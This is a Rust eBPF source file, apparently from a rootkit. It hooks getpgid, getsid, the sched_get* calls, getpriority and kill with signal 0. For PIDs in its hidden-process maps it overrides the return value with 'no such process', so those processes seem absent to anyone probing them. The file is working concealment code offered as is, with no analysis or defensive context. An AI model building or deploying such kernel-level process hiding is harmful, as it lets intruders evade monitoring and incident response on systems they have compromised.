use aya_ebpf::{
    bindings::pt_regs,
    helpers::{bpf_get_current_pid_tgid, bpf_probe_read, generated::bpf_override_return},
    macros::{kprobe, kretprobe, map},
    maps::HashMap,
    programs::{ProbeContext, RetProbeContext},
};
use aya_log_ebpf::info;

use crate::{HIDDEN_PIDS, HIDDEN_THREADS};

#[map]
static CURRENT_TGID: HashMap<u64, u8> = HashMap::<u64, u8>::with_max_entries(32, 0);

#[kprobe]
pub fn x64_sys_getpgid_enter(ctx: ProbeContext) -> Result<u32, ()> {
    x64_sysprobe_enter(ctx, "getpgid")
}
#[kretprobe]
pub fn x64_sys_getpgid_exit(ctx: RetProbeContext) -> Result<u32, ()> {
    x64_sys_probe_exit(ctx)
}

#[kprobe]
pub fn x64_sys_getsid_enter(ctx: ProbeContext) -> Result<u32, ()> {
    x64_sysprobe_enter(ctx, "getsid")
}
#[kretprobe]
pub fn x64_sys_getsid_exit(ctx: RetProbeContext) -> Result<u32, ()> {
    x64_sys_probe_exit(ctx)
}

#[kprobe]
pub fn x64_sys_sched_getaffinity_enter(ctx: ProbeContext) -> Result<u32, ()> {
    x64_sysprobe_enter(ctx, "sched_getaffinity")
}
#[kretprobe]
pub fn x64_sys_sched_getaffinity_exit(ctx: RetProbeContext) -> Result<u32, ()> {
    x64_sys_probe_exit(ctx)
}

#[kprobe]
pub fn x64_sys_sched_getparam_enter(ctx: ProbeContext) -> Result<u32, ()> {
    x64_sysprobe_enter(ctx, "sched_getparam")
}
#[kretprobe]
pub fn x64_sys_sched_getparam_exit(ctx: RetProbeContext) -> Result<u32, ()> {
    x64_sys_probe_exit(ctx)
}
#[kprobe]
pub fn x64_sys_sched_getscheduler_enter(ctx: ProbeContext) -> Result<u32, ()> {
    x64_sysprobe_enter(ctx, "sched_getscheduler")
}
#[kretprobe]
pub fn x64_sys_sched_getscheduler_exit(ctx: RetProbeContext) -> Result<u32, ()> {
    x64_sys_probe_exit(ctx)
}
#[kprobe]
pub fn x64_sys_sched_rr_get_interval_enter(ctx: ProbeContext) -> Result<u32, ()> {
    x64_sysprobe_enter(ctx, "sched_rr_get_interval")
}
#[kretprobe]
pub fn x64_sys_sched_rr_get_interval_exit(ctx: RetProbeContext) -> Result<u32, ()> {
    x64_sys_probe_exit(ctx)
}

#[kprobe]
pub fn x64_sys_getpriority_enter(ctx: ProbeContext) -> Result<u32, ()> {
    let regs = unsafe { bpf_probe_read((*ctx.regs).rdi as *const pt_regs).unwrap() };
    let pid = regs.rsi as u32;

    if unsafe { HIDDEN_PIDS.get(&pid).is_some() } || unsafe { HIDDEN_THREADS.get(&pid).is_some() } {
        info!(&ctx, "getpriority(_,{}) detected", pid);
        let caller_pid = bpf_get_current_pid_tgid();
        CURRENT_TGID.insert(&caller_pid, &0, 0).unwrap()
    }
    Ok(0)
}
#[kretprobe]
pub fn x64_sys_getpriority_exit(ctx: RetProbeContext) -> Result<u32, ()> {
    x64_sys_probe_exit(ctx)
}

#[kprobe]
pub fn x64_sys_kill_enter(ctx: ProbeContext) -> Result<u32, ()> {
    let regs = unsafe { bpf_probe_read((*ctx.regs).rdi as *const pt_regs).unwrap() };
    let pid = regs.rdi as u32;
    let sig = regs.rsi;

    if sig == 0
        && (unsafe { HIDDEN_PIDS.get(&pid).is_some() }
            || unsafe { HIDDEN_THREADS.get(&pid).is_some() })
    {
        info!(&ctx, "x64_syskill({},0) detected", regs.rdi);
        let caller_pid = bpf_get_current_pid_tgid();
        CURRENT_TGID.insert(&caller_pid, &0, 0).unwrap()
    }
    Ok(0)
}

#[kretprobe]
pub fn x64_sys_kill_exit(ctx: RetProbeContext) -> Result<u32, ()> {
    let caller_pid = bpf_get_current_pid_tgid();
    if unsafe { CURRENT_TGID.get(&caller_pid).is_some() } {
        let ret = -3i64 as u64;
        unsafe { bpf_override_return(ctx.regs, ret) };
    }

    let _ = CURRENT_TGID.remove(&caller_pid);
    Ok(0)
}

fn x64_sysprobe_enter(ctx: ProbeContext, kfunc_name: &str) -> Result<u32, ()> {
    let regs = unsafe { bpf_probe_read((*ctx.regs).rdi as *const pt_regs).unwrap() };
    let pid = regs.rdi as u32;

    if unsafe { HIDDEN_PIDS.get(&pid).is_some() } || unsafe { HIDDEN_THREADS.get(&pid).is_some() } {
        info!(&ctx, "{}({}, _) detected ", kfunc_name, regs.rdi,);
        let caller_pid = bpf_get_current_pid_tgid();
        CURRENT_TGID.insert(&caller_pid, &0, 0).unwrap()
    }
    Ok(0)
}
fn x64_sys_probe_exit(ctx: RetProbeContext) -> Result<u32, ()> {
    let caller_pid = bpf_get_current_pid_tgid();
    if unsafe { CURRENT_TGID.get(&caller_pid).is_some() } {
        let ret = -3i64 as u64;
        unsafe { bpf_override_return(ctx.regs, ret) };
    }
    let _ = CURRENT_TGID.remove(&caller_pid);
    Ok(0)
}
